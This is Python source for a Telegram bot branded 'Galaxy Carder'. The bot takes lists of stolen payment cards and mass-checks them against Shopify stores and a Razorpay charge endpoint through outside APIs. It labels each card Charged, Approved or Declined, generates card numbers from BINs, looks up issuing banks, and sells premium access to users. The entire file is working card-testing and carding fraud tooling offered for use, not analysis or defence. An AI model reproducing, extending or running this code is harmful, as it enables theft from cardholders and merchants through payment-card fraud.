    first_name = message.from_user.first_name or ""
    last_name = message.from_user.last_name or ""
    full_name = (first_name + " " + last_name).strip() or "User"
    user_link = f'<a href="tg://user?id={user_id}">{full_name}</a>'
    bot_credit = '<a href="https://t.me/GalaxyBio">Galaxy Carder</a>'  # Change to your channel

    final_text = (f"<b>『 Mass Auto Shopify [ /msh ] 』</b>\n"
                  "━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
                  f"<b>Progress ➜</b> [{len(cards)} / {len(cards)}]\n\n"
                  + '\n'.join(results) +
                  f"\n𝐓𝐢𝐦𝐞 ➜  {hours}.h {minutes}.m {seconds}.s\n"
                  f"𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜  {user_link} [ PREMIUM ]\n"
                  "━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
                  f"𝐁𝐨𝐭 𝐁𝐲 ➜ {bot_credit}")

    # Final edit with summary
    try:
        bot.edit_message_text(final_text, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="HTML")
    except Exception:
        pass
from telebot import types

def normalize_card(raw_cc):
    raw_cc = raw_cc.strip()
    for ch in [' ', '-', ':', ';', ',']:
        raw_cc = raw_cc.replace(ch, '')
    parts = raw_cc.split('|')
    if len(parts) == 4:
        card, mm, yy, cvv = parts
        mm = mm.zfill(2)
        yy = "20" + yy if len(yy) == 2 else yy
        return f"{card}|{mm}|{yy}|{cvv}"
    return None

ID_FILE = "id.txt"

def load_premium_users():
    premium_users = {}
    current_time = time.time()
    valid_lines = []

    if os.path.exists(ID_FILE):
        with open(ID_FILE, "r") as f:
            for line in f:
                try:
                    user_id_str, expiry_str = line.strip().split(":")
                    user_id = int(user_id_str)
                    expiry = float(expiry_str)
                    if expiry > current_time:
                        premium_users[user_id] = expiry
                        valid_lines.append(f"{user_id}:{expiry}")
                except:
                    continue

    # Rewrite only valid entries
    with open(ID_FILE, "w") as f:
        f.write("\n".join(valid_lines) + "\n")

    return premium_users
def save_premium_user(user_id, days):
    expiry = time.time() + days * 86400
    premium_users = load_premium_users()
    premium_users[user_id] = expiry

    with open(ID_FILE, "w") as f:
        for uid, ts in premium_users.items():
            f.write(f"{uid}:{ts}\n")


@bot.message_handler(content_types=["document"])
def mass_shtxt_handler(message):
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"  # ✅ Required to fix your error

    premium_users = load_premium_users()
    if user_id not in premium_users:
        bot.reply_to(message, "❌ You do not have premium access or your access has expired.")
        return

    # rest of your logic...

    start_time = time.time()

    processing = bot.reply_to(message, "📥 Upload received. Initializing check...⌛")
    message_id = processing.message_id

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 STOP", callback_data='stop'))
    bot.edit_message_text(chat_id=message.chat.id, message_id=message_id, text="🧪 Starting check...\nClick below to stop.", reply_markup=markup)

    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    with open("combo.txt", "wb") as f:
        f.write(downloaded)

    try:
        with open("sh.json", "r") as j:
            user_domains = json.load(j)
        domain = user_domains.get(str(user_id), "")
    except:
        domain = ""

    if not domain:
        bot.edit_message_text(chat_id=message.chat.id, message_id=message_id,
                              text="❌ No domain set. Use /seturl to set your Shopify domain.")
        return

    with open("combo.txt", "r") as file:
        lines = [line.strip() for line in file if line.strip()]
        total = len(lines)

        if total > 100:
            bot.edit_message_text(chat_id=message.chat.id, message_id=message_id,
                                  text=f"🚨 File has {total} CCs. Max allowed is 100.")
            return

        decline_list = [
            "GENERIC_ERROR", "AUTHORIZATION_ERROR", "CARD_DECLINED", "PICK_UP_CARD", "INCORRECT_NUMBER",
            "PROXY DEAD", "PROCESSING_ERROR", "EXPIRED_CARD", "CARD TOKEN IS EMPTY", "FRAUD_SUSPECTED",
            "INVALID_CVC", "INVAILD_PAYMENT_ERROR", "UNPROCESSABLE_TRANSACTION", "DECLINED", "INCORRECT_ZIP"
        ]
        approve_list = ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "3D CC", "3D_AUTHENTICATION"]
        unknown_list = ["INVALID URL", "HANDLE IS EMPTY", "RECEIPT ID IS EMPTY", "HCAPTCHA DETECTED", "AMOUNT_TOO_SMALL"]

        ch, live, dd = 0, 0, 0

        for count, raw_cc in enumerate(lines, 1):
            if os.path.exists("stop.stop"):
                bot.edit_message_text(chat_id=message.chat.id, message_id=message_id, text="🛑 Bot stopped by user.")
                os.remove("stop.stop")
                return

            cc = normalize_card(raw_cc)
            if not cc:
                # skip invalid format lines silently
                continue

            try:
                api = f"https://app17033.cloudwayssites.com/ipx.php?site={domain}&cc={cc}"
                res = requests.get(api, timeout=20)
                result = res.json()
            except:
                result = {"Response": "UNKNOWN", "Status": "false", "Price": "0", "Gateway": "Unknown"}

            response = result.get("Response", "N/A").upper()
            price = result.get("Price", "N/A")
            gateway = result.get("Gateway", "Unknown")
            progress = f"{count}/{total}"

            bot.edit_message_text(chat_id=message.chat.id, message_id=message_id,
                                  text=f"🔍 <b>Checking:</b> <code>{cc}</code>\n<b>Response:</b> <code>{response}</code>\n<b>Progress:</b> {progress}\n⌛ Please wait...",
                                  parse_mode="HTML", reply_markup=markup)

            if any(x in response for x in ["CHARGED", "SUCCEEDED", "ORDER PLACED", "THANK YOU"]):
                final_status = "🔥 Charged"
                ch += 1
            elif response in decline_list:
                final_status = "❌ Declined"
                dd += 1
            elif response in approve_list:
                final_status = "✅ Approved"
                live += 1
            elif response in unknown_list:
                final_status = "⚠️ Unknown"
            else:
                final_status = response
                dd += 1

            if final_status in ["🔥 Charged", "✅ Approved"]:
                msg = f"""
💳 <b>Card Checked Successfully</b>

<b>👤 User:</b> @{username}
<b>🔢 Card:</b> <code>{cc}</code>
<b>💬 Status:</b> {final_status}
<b>📩 Response:</b> <code>{response}</code>
<b>💰 Price:</b> ${price}
<b>🧾 Gateway:</b> {gateway}
<b>📊 Progress:</b> {progress}
<b>⏱ Time:</b> {round(time.time() - start_time, 2)}s

<b>🤖 Bot By:</b> @Galaxy_Carder
"""
                bot.send_message(chat_id=message.chat.id, text=msg, parse_mode="HTML")

    bot.edit_message_text(chat_id=message.chat.id, message_id=message_id,
                          text=f"""
🎯 <b>Mass Check Completed</b>

<b>🔥 Charged:</b> {ch}
<b>✅ Approved:</b> {live}
<b>❌ Dead:</b> {dd}
<b>📦 Total:</b> {total}

<b>⏱ Time Taken:</b> {round(time.time() - start_time, 2)}s
<b>👤 User:</b> @{username}

<b>🤖 Bot By:</b> @Galaxy_Carder
""", parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    with open("stop.stop", "w") as f:
        pass
    bot.answer_callback_query(call.id, "Bot will stop processing.")
    bot.send_message(call.message.chat.id, "🛑 Bot has been stopped.")

import re
import requests
import threading
import time
from telebot import types

API_BASE_URL = "https://garryrazorpay-ec783f3c20da.herokuapp.com/"
BINLIST_URL = "https://lookup.binlist.net/"
ANTIBIN_URL = "https://bins.antipublic.cc/bins/"
CHANNEL_URL = "https://t.me/GalaxyBio"
ID_FILE = "id.txt"
DEFAULT_PRICE = 1.0
RATE_LIMIT_SECONDS = 10  # per-user cooldown
user_last_used = {}

# Unified regex snippet for card detection: supports / or |, M or MM, YY or YYYY
GENERIC_CARD_PATTERN = r'(\d{16})[\/\|](\d{1,2})[\/\|](\d{2,4})[\/\|](\d{3,4})'
# Direct command: anchored match with optional price
a = GENERIC_CARD_PATTERN
CMD_PATTERN = re.compile(rf'^{GENERIC_CARD_PATTERN}(?:\s+(\d+(?:\.\d+)?))?$')
# Search anywhere: not anchored, no price capture
SEARCH_PATTERN = re.compile(GENERIC_CARD_PATTERN)

def load_premium_ids():
    ids = {}
    try:
        with open(ID_FILE, 'r') as f:
            lines = f.read().splitlines()
    except FileNotFoundError:
        return ids
    changed = False
    now = time.time()
    for line in lines:
        if not line.strip(): continue
        try:
            uid_str, exp_str = line.split(':')
            uid = int(uid_str)
            exp = float(exp_str)
            if exp > now:
                ids[uid] = exp
            else:
                changed = True
        except:
            continue
    # rewrite file without expired
    if changed:
        with open(ID_FILE, 'w') as f:
            for uid, exp in ids.items():
                f.write(f"{uid}:{exp}\n")
    return ids


def extract_card_from_text(text: str) -> str:
    m = SEARCH_PATTERN.search(text or "")
    if m:
        card, mth, yr, cvv = m.groups()
        if len(yr) == 2:
            yr = '20' + yr
        mth = mth.zfill(2)
        return f"{card}|{mth}|{yr}|{cvv}"
    return None


def fetch_bin_data(bin_number: str) -> dict:
    info = {'scheme':'N/A','type':'N/A','brand':'N/A','bank':'N/A','country':'N/A'}
    try:
        resp = requests.get(f"{BINLIST_URL}{bin_number}", timeout=5)
        resp.raise_for_status()
        data = resp.json()
        info.update({
            'scheme': data.get('scheme','').upper() or info['scheme'],
            'type': data.get('type','').capitalize() or info['type'],
            'brand': data.get('brand','').upper() or info['brand'],
            'bank': data.get('bank',{}).get('name','') or info['bank'],
            'country': f"{data.get('country',{}).get('name','')} {data.get('country',{}).get('emoji','')}".strip() or info['country'],
        })
    except:
        pass
    if any(v == 'N/A' for v in info.values()):
        try:
            resp = requests.get(f"{ANTIBIN_URL}{bin_number}", timeout=5)
            resp.raise_for_status()
            data = resp.json()
            info.update({
                'scheme': data.get('scheme','').upper() or info['scheme'],
                'type': data.get('type','').upper() or info['type'],
                'brand': data.get('cardType','').upper() or info['brand'],
                'bank': data.get('bank','') or info['bank'],
                'country': f"{data.get('country','')} {data.get('emoji','')}".strip() or info['country'],
            })
        except:
            pass
    return info


def razorpay_charge(message: types.Message, cc_full: str, price_val: float):
    chat_id = message.chat.id
    price_str = str(int(price_val)) if price_val.is_integer() else str(price_val)
    status_msg = bot.send_message(chat_id, f"<i>⏳ Charging ₹{price_str} via Razorpay…</i>", parse_mode='HTML', reply_to_message_id=message.message_id)
    container = {}
    def do_request():
        try:
            url = f"{API_BASE_URL}?cc={cc_full}&price={price_str}"
            container['resp'] = requests.get(url, timeout=30).json()
        except Exception as e:
            container['error'] = e
        finally:
            container['done'] = True
    threading.Thread(target=do_request).start()
    stages = [
        "❄️ Establishing secure channel…",
        "🛒 Validating card credentials…",
        "💸 Encrypting payment data…",
        "📨 Sending transaction request…",
        "📮 Awaiting Razorpay response…"
    ]
    idx = 0
    while not container.get('done'):
        try:
            bot.edit_message_text(f"<pre><b><i>{stages[idx % len(stages)]}</i></b></pre>", chat_id, status_msg.message_id, parse_mode='HTML', disable_web_page_preview=True)
        except:
            pass
        time.sleep(1); idx += 1
    if 'error' in container:
        bot.send_message(chat_id, f"❌ <b>Error:</b> <code>{container['error']}</code>", parse_mode='HTML', reply_to_message_id=message.message_id)
        bot.delete_message(chat_id, status_msg.message_id)
        return
    resp = container['resp']; result = resp.get('result', {}); meta = resp.get('meta', {}); msg_text = result.get('message','')
    status_line = ("🔥 Charged 🔥" if msg_text=="✅ Payment Successful" else "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅" if msg_text.startswith("✅ Payment Initiated") or msg_text=="🔐 3DS Authentication Required" else "𝗗𝗲𝗰𝗹𝗶𝗻𝗲 ❌")
    card_num = result.get('card', cc_full); bin6 = card_num.split('|')[0][:6]; bin_info = fetch_bin_data(bin6)
    bullet = f'<a href="{CHANNEL_URL}">《↯》</a>'
    out = (
        f"<b>{status_line}</b>\n\n"
        f"{bullet} <b>𝗖𝗖:</b> <code>{card_num}</code>\n"
        f"{bullet} <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬:</b> Razorpay ₹{price_str} Charge\n"
        f"{bullet} <b>𝗔𝗠𝗢𝗨𝗡𝗧:</b> ₹{price_str} 💸\n"
        f"{bullet} <b>𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘:</b> {msg_text}\n\n"
        f"{bullet} <b>𝗦𝗖𝗛𝗘𝗠𝗘:</b> {bin_info['scheme']}\n"
        f"{bullet} <b>𝗧𝗬𝗣𝗘:</b> {bin_info['type']}\n"
        f"{bullet} <b>𝗕𝗥𝗔𝗡𝗗:</b> {bin_info['brand']}\n"
        f"{bullet} <b>𝗕𝗔𝗡𝗞:</b> {bin_info['bank']}\n"
        f"{bullet} <b>𝗖𝗢𝗨𝗡𝗧𝗥𝗬:</b> {bin_info['country']}\n\n"
        f"{bullet} <b>𝗖𝗛𝗘𝗖𝗞 𝗕𝗬:</b> @{message.from_user.username or message.from_user.first_name}\n"
        f"{bullet} <b>𝗕𝗢𝗧 𝗕𝗬:</b> <a href=\"{CHANNEL_URL}\"><b><i>Galaxy Carder 💖</i></b></a>\n"
        f"{bullet} <b>𝗧𝗜𝗠𝗘:</b> {meta.get('duration','N/A')}"
    )
    bot.send_message(message.chat.id, out, parse_mode='HTML', disable_web_page_preview=True, reply_to_message_id=message.message_id)
    bot.delete_message(message.chat.id, status_msg.message_id)

# Unified /rz handler
@bot.message_handler(func=lambda message: bool(re.match(r'^([./!])rz\b', message.text or '', re.IGNORECASE)))
def handle_rz(message: types.Message):
    # premium check
    premium_ids = load_premium_ids()
    uid = message.from_user.id
    if uid not in premium_ids:
        return bot.reply_to(message, "❌ You do not have premium access. Please redeem or purchase a code.")

    now = time.time()
    if uid in user_last_used and now - user_last_used[uid] < RATE_LIMIT_SECONDS:
        return
    user_last_used[uid] = now

    parts = message.text.strip().split()
    price = DEFAULT_PRICE; cc = None
    if message.reply_to_message:
        if len(parts) == 2:
            try: price = float(parts[1])
            except: price = DEFAULT_PRICE
        cc = extract_card_from_text(message.reply_to_message.text)
        if not cc:
            return bot.reply_to(message, "❌ No valid card found in replied message.")
    else:
        if len(parts) < 2:
            return bot.reply_to(message, "❌ Usage: /rz <card> [price]")
        m = CMD_PATTERN.match(parts[1] + (" " + parts[2] if len(parts)>2 else ""))
        if not m:
            return bot.reply_to(message, "❌ Invalid card format.")
        cc = f"{m.group(1)}|{m.group(2).zfill(2)}|{('20'+m.group(3)) if len(m.group(3))==2 else m.group(3)}|{m.group(4)}"
        if m.group(5):
            try: price = float(m.group(5))
            except: price = DEFAULT_PRICE
    razorpay_charge(message, cc, price)


import os
import re
import json
import time
import requests
from telebot import TeleBot, types

# ——— CONFIG ———

OWNER_ID       = 6847432039
SHOPIFY_CFG    = "sh.json"
ID_TXT         = "id.txt"
GROUPS_CFG     = "groups.json"
RATE_LIMIT     = 30   # seconds
API_TIMEOUT    = 20   # seconds

# ——— STATUS LISTS ———
DECLINE_LIST = [
    "GENERIC_ERROR", "AUTHORIZATION_ERROR", "CARD_DECLINED", "PICK_UP_CARD",
    "INCORRECT_NUMBER", "PROXY DEAD", "PROCESSING_ERROR", "EXPIRED_CARD",
    "CAMPAIGN_NOT_ALLOWED", "FRAUD_SUSPECTED", "INVALID_CVC", "INVAILD_PAYMENT_ERROR",
    "UNPROCESSABLE_TRANSACTION", "DECLINED", "INCORRECT_ZIP"
]
APPROVE_LIST = [
    "INCORRECT_CVC", "INSUFFICIENT_FUNDS", "3D CC", "3D_AUTHENTICATION",
    "THANK YOU", "APPROVED"
]
UNKNOWN_LIST = [
    "INVALID URL", "HANDLE IS EMPTY", "RECEIPT ID IS EMPTY",
    "HCAPTCHA DETECTED", "AMOUNT_TOO_SMALL"
]



# ——— STATE ———
user_last_used = {}
ALLOWED_GROUPS = []

# ——— UTILITIES ———
def load_allowed_groups():
    if os.path.isfile(GROUPS_CFG):
        try:
            with open(GROUPS_CFG, "r") as f:
                return json.load(f)
        except json.JSONDecodeError:
            pass
    return []

def save_allowed_groups(groups):
    with open(GROUPS_CFG, "w") as f:
        json.dump(groups, f)

def get_user_domain(user_id):
    if not os.path.isfile(SHOPIFY_CFG):
        return None
    try:
        with open(SHOPIFY_CFG) as f:
            data = json.load(f)
        return data.get(str(user_id))
    except:
        return None

def extract_card_from_text(text):
    s = text.replace(" ", "")
    m = re.search(r"(\d{12,16})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})", s)
    if not m:
        return None
    cc, mm, yy, cvv = m.groups()
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = "20" + yy
    return f"{cc}|{mm}|{yy}|{cvv}"

def is_premium(user_id):
    if not os.path.isfile(ID_TXT):
        return False
    try:
        with open(ID_TXT) as f:
            for line in f:
                if line.split(":")[0] == str(user_id):
                    return True
    except:
        pass
    return False

def get_bin_info(bin6):
    try:
        r = requests.get(f"https://drlabapis.onrender.com/api/bin?bin={bin6}", timeout=10)
        if r.status_code == 200:
            d = r.json()
            return {
                "bank":   d.get("issuer", "N/A").upper(),
                "type":   d.get("type", "N/A").upper(),
                "scheme": d.get("scheme", "N/A").upper(),
                "country":d.get("country", "N/A").upper()
            }
    except:
        pass
    return {"bank":"N/A","type":"N/A","scheme":"N/A","country":"N/A"}

# load groups on start
ALLOWED_GROUPS = load_allowed_groups()

# ——— COMMAND: /addgc ———
@bot.message_handler(func=lambda message: bool(re.match(r'^([./!])addgc\b', message.text or '', re.IGNORECASE)))
def add_group_access(message):
    if message.from_user.id != OWNER_ID:
        return bot.reply_to(message, "❌ Only the bot owner can use this.")
    if message.chat.type not in ['group', 'supergroup']:
        return bot.reply_to(message, "❌ Use this in a group chat.")
    gid = message.chat.id
    if gid not in ALLOWED_GROUPS:
        ALLOWED_GROUPS.append(gid)
        save_allowed_groups(ALLOWED_GROUPS)
        bot.reply_to(message, f"✅ Group <code>{gid}</code> authorized.", parse_mode="HTML")
    else:
        bot.reply_to(message, "✅ This group is already authorized.")

@bot.message_handler(func=lambda message: bool(re.match(r'^([./!])slf\b', message.text or '', re.IGNORECASE)))
def handle_selfshopify(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    start_time = time.time()

    if message.chat.type == 'private':
        return bot.reply_to(message, "❌ This command works only in groups.", reply_to_message_id=message.message_id)
    if chat_id not in ALLOWED_GROUPS:
        return bot.reply_to(message, "❌ This group is not authorized.", reply_to_message_id=message.message_id)

    now = time.time()
    if now - user_last_used.get(user_id, 0) < RATE_LIMIT:
        return bot.reply_to(message, f"⏳ Wait {RATE_LIMIT}s before retrying.", reply_to_message_id=message.message_id)
    user_last_used[user_id] = now

    cc = None
    if message.reply_to_message:
        cc = extract_card_from_text(message.reply_to_message.text or "")
    else:
        parts = message.text.strip().split(maxsplit=1)
        if len(parts) == 2:
            cc = extract_card_from_text(parts[1])
    if not cc:
        return bot.reply_to(message, "❌ No valid card found. Reply or use `/slf <card>`", parse_mode="Markdown", reply_to_message_id=message.message_id)

    domain = get_user_domain(user_id)
    if not domain:
        return bot.reply_to(message, "❌ No domain set. Use `/seturl` to configure your Shopify site.", parse_mode="Markdown", reply_to_message_id=message.message_id)

    # reply-based processing message
    stages = [
        "⚡ Initializing Galaxy Firewall...",
        "🔍 Calibrating Quantum Gateway...",
        "🛰️ Engaging Risk Scan Radar...",
        "🛠️ Tuning Response Analyzers...",
        "🚀 Finalizing Launch Sequence..."
    ]
    msg = bot.send_message(chat_id, "🔄 Starting Secure AutoCheck...", parse_mode="HTML", reply_to_message_id=message.message_id)
    for step in stages:
        time.sleep(0.7)
        bot.edit_message_text(f"<b>{step}</b>", chat_id, msg.message_id, parse_mode="HTML")

    api_url = "http://app17033.cloudwayssites.com/ipx.php"
    try:
        resp = requests.get(
            api_url,
            params={'site': domain, 'cc': cc},
            headers={'User-Agent': 'Mozilla/5.0'},
            timeout=API_TIMEOUT
        )
    except requests.exceptions.Timeout:
        return bot.edit_message_text("⚠️ <b>Connection timeout.</b>", chat_id, msg.message_id, parse_mode="HTML")
    except Exception as e:
        return bot.edit_message_text(f"❌ <b>Error:</b> {e}", chat_id, msg.message_id, parse_mode="HTML")

    if resp.status_code == 403:
        return bot.edit_message_text(
            "❌ <b>Access denied (403). Check your API credentials or IP whitelist.</b>",
            chat_id, msg.message_id, parse_mode="HTML"
        )
    if resp.status_code != 200:
        return bot.edit_message_text(f"❌ <b>API Error {resp.status_code}</b>", chat_id, msg.message_id, parse_mode="HTML")

    try:
        data = resp.json()
    except:
        data = {"Response": resp.text.strip(), "Gateway": "Unknown", "Price": "N/A", "cc": cc}

    gateway    = data.get("Gateway", "N/A")
    msg_text   = data.get("Response", "No message returned.")
    price      = data.get("Price", "N/A")
    card_num   = data.get("cc", cc)
    raw_status = data.get("status", "").upper() or msg_text.upper()

    msg_upper = msg_text.upper()

    if "THANK YOU" in msg_upper:
        status_disp = "<b><i>🔥 CHARGED</i></b>"
    elif any(term in msg_upper for term in APPROVE_LIST) or raw_status in APPROVE_LIST:
        status_disp = "<b><i>❎ APPROVED</i></b>"
    elif raw_status in DECLINE_LIST or any(term in msg_upper for term in DECLINE_LIST):
        status_disp = "<b><i>❌ DECLINED</i></b>"
    elif raw_status in UNKNOWN_LIST or any(term in msg_upper for term in UNKNOWN_LIST):
        status_disp = "<b><i>⚠️ UNKNOWN</i></b>"
    else:
        status_disp = "<b><i>⚠️ UNKNOWN</i></b>"

    bin6 = cc.split("|")[0][:6]
    bin_info = get_bin_info(bin6)
    user_status = 'PREMIUM' if is_premium(user_id) else 'FREE'
    user_name = message.from_user.username or message.from_user.first_name

    out = f"""
<b><i>『 🔮 SELF Shopify Checker 🔮 』</i></b>
━━━━━━━━━━━━━━━━━━━━━━
<b><i>💳 Card:</i></b> <code>{card_num}</code>
<b><i>📶 Status:</i></b> {status_disp}
<b><i>🌐 Gateway:</i></b> <code>{gateway}</code>
<b><i>💸 Price:</i></b> ${price}
<b><i>📩 Response:</i></b> <code>{msg_text}</code>
━━━━━━━━━━━━━━━━━━━━━━
<b><i>🏦 Bank:</i></b> {bin_info['bank']}
<b><i>💳 Type:</i></b> {bin_info['type']}
<b><i>🧾 Scheme:</i></b> {bin_info['scheme']}
<b><i>🌍 Country:</i></b> {bin_info['country']}
<b><i>🪪 Status:</i></b> {user_status}
<b><i>👤 Checked by:</i></b> @{user_name} [{user_id}]
"""

    bot.edit_message_text(out, chat_id, msg.message_id, parse_mode='HTML')


import telebot
import asyncio
import aiohttp
import re
import time
import os
import pycountry



def get_country_flag(country_value):
    try:
        if len(country_value) == 2:
            code = country_value.upper()
        else:
            country = pycountry.countries.get(name=country_value.title())
            if not country:
                matches = pycountry.countries.search_fuzzy(country_value)
                country = matches[0] if matches else None
            code = country.alpha_2 if country else None

        return chr(127397 + ord(code[0])) + chr(127397 + ord(code[1])) if code else "🏳️"
    except:
        return "🏳️"

async def lookup_bin(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as response:
                if response.status == 200:
                    bin_data = await response.json()
                    country = bin_data.get("country", "UNKNOWN").upper()
                    return {
                        "bank": bin_data.get("bank", "UNKNOWN").upper(),
                        "card_type": bin_data.get("type", "UNKNOWN").upper(),
                        "network": bin_data.get("scheme", "UNKNOWN").upper(),
                        "tier": bin_data.get("brand", "UNKNOWN").upper(),
                        "country": country,
                        "flag": get_country_flag(country)
                    }
    except:
        pass
    return {
        "bank": "UNKNOWN", "card_type": "UNKNOWN", "network": "UNKNOWN",
        "tier": "UNKNOWN", "country": "UNKNOWN", "flag": "🏳️"
    }

async def generate_cards(bin_full, count):
    url = f"https://drlabapis.onrender.com/api/ccgenerator?bin={bin_full}&count={count}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as response:
                if response.status == 200:
                    raw = await response.text()
                    return raw.strip().splitlines()
                else:
                    return {"error": f"API error {response.status}"}
    except Exception as e:
        return {"error": str(e)}

def format_cards(cards, bin_number, bin_info):
    if isinstance(cards, dict) and "error" in cards:
        return f"❌ Error: {cards['error']}"

    formatted = f"𝗕𝗜𝗡 ⇾ <code>{bin_number}</code>\n𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ <code>{len(cards)}</code>\n\n"
    for card in cards:
        formatted += f"<code>{card.upper()}</code>\n"
    formatted += f"\n𝗜𝗻𝗳𝗼: {bin_info['card_type']} - {bin_info['network']} ({bin_info['tier']})\n"
    formatted += f"𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info['bank']}\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['flag']}"
    return formatted

@bot.message_handler(func=lambda m: m.text.lower().startswith(('/gen', '.gen', '!gen')))
def gen_handler(message):
    try:
        args = message.text.split()
        if len(args) < 2:
            return bot.reply_to(message, "❌ Usage:\n/gen <bin>\n/gen <bin> <count>\n/gen <bin|mm|yy> <count>")

        raw_bin = args[1]
        count = int(args[2]) if len(args) > 2 and args[2].isdigit() else 10

        is_six_digit_bin = re.fullmatch(r'\d{6}', raw_bin)
        if is_six_digit_bin:
            bin_number = raw_bin
            bin_to_api = raw_bin
        else:
            match = re.match(r'^(\d{6})\|(\d{2})\|(\d{2,4})$', raw_bin)
            if not match:
                return bot.reply_to(message, "❌ Invalid BIN format.")
            bin_number = match.group(1)
            bin_to_api = raw_bin

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        cards = loop.run_until_complete(generate_cards(bin_to_api, count))
        bin_info = loop.run_until_complete(lookup_bin(bin_number))
        loop.close()

        if isinstance(cards, dict) and "error" in cards:
            return bot.reply_to(message, f"❌ {cards['error']}")

        if count > 20:
            filename = f"{bin_number}_cards.txt"
            with open(filename, "w") as f:
                f.write("\n".join(cards))
            with open(filename, "rb") as f:
                caption = f"𝗕𝗜𝗡 ⇾ <code>{bin_number}</code>\n𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ <code>{count}</code>\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['flag']}\n𝗕𝗮𝗻𝗸: {bin_info['bank']}"
                bot.send_document(message.chat.id, f, caption=caption, parse_mode="HTML", reply_to_message_id=message.message_id)
            os.remove(filename)
        else:
            output = format_cards(cards, bin_number, bin_info)
            bot.send_message(message.chat.id, output, parse_mode="HTML", reply_to_message_id=message.message_id)

    except Exception as e:
        bot.reply_to(message, f"❌ ERROR: {e}")
ADMIN_ID = 6847432039  # Replace with your Telegram ID

@bot.message_handler(commands=["broadcast"])
def handle_broadcast(message):
    if message.from_user.id != ADMIN_ID:
        return bot.reply_to(message, "❌ You are not authorized to use this command.")

    if not message.reply_to_message:
        return bot.reply_to(message, "❌ Reply to a message you want to broadcast.")

    # Read users from users.txt
    try:
        with open("users.txt", "r") as file:
            users = file.readlines()
        chat_ids = [int(line.split(',')[0].strip()) for line in users if line.strip()]
    except Exception as e:
        return bot.reply_to(message, f"❌ Failed to read users.txt:\n{e}")

    success, failed = 0, 0
    for chat_id in chat_ids:
        try:
            bot.copy_message(chat_id, message.chat.id, message.reply_to_message.message_id)
            success += 1
        except:
            failed += 1

    bot.reply_to(message, f"📢 Broadcast sent to {success} users.\n❌ Failed to send to {failed}.")



from datetime import datetime
import os

ADMIN_ID = 6847432039  # replace with your actual admin ID

@bot.message_handler(commands=["stats"])
def send_stats(message):
    if message.from_user.id != ADMIN_ID:
        return bot.reply_to(message, "❌ You are not authorized to use this command.")

    try:
        users = {}
        premium = {}

        # Load all users from users.txt
        if os.path.exists("users.txt"):
            with open("users.txt", "r") as f:
                for line in f:
                    parts = line.strip().split(",")
                    if len(parts) >= 3:
                        chatid, name, username = parts
                        users[chatid] = {
                            "name": name,
                            "username": username
                        }

        # Load all premium from id.txt
        if os.path.exists("id.txt"):
            with open("id.txt", "r") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) == 2 and parts[0].isdigit():
                        uid, expiry = parts
                        premium[uid] = expiry

        total_users = len(users)
        total_premium = len(premium)
        total_free = total_users - total_premium

        # Format premium list
        premium_lines = []
        for uid, expiry in premium.items():
            user = users.get(uid, {})
            name = user.get("name", "Unknown")
            username = user.get("username", "")
            profile_link = f"<a href='tg://user?id={uid}'>{name}</a>"
            uname = f"(@{username})" if username else ""
            expiry_time = datetime.fromtimestamp(float(expiry)).strftime("%Y-%m-%d %H:%M:%S")
            premium_lines.append(f"• {profile_link} {uname} — <code>{expiry_time}</code>")

        msg = f"""
<b>📊 Galaxy Checker Stats</b>
━━━━━━━━━━━━━━━━━━━━━━
👥 Total Users: <code>{total_users}</code>
🆓 Free Users: <code>{total_free}</code>
🔐 Premium Users: <code>{total_premium}</code>
━━━━━━━━━━━━━━━━━━━━━━
"""

        if premium_lines:
            msg += "<b>🔒 Premium Members:</b>\n" + "\n".join(premium_lines)

        bot.send_message(message.chat.id, msg, parse_mode="HTML", disable_web_page_preview=True)

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

print("✅ Bot is running...")
bot.infinity_polling()

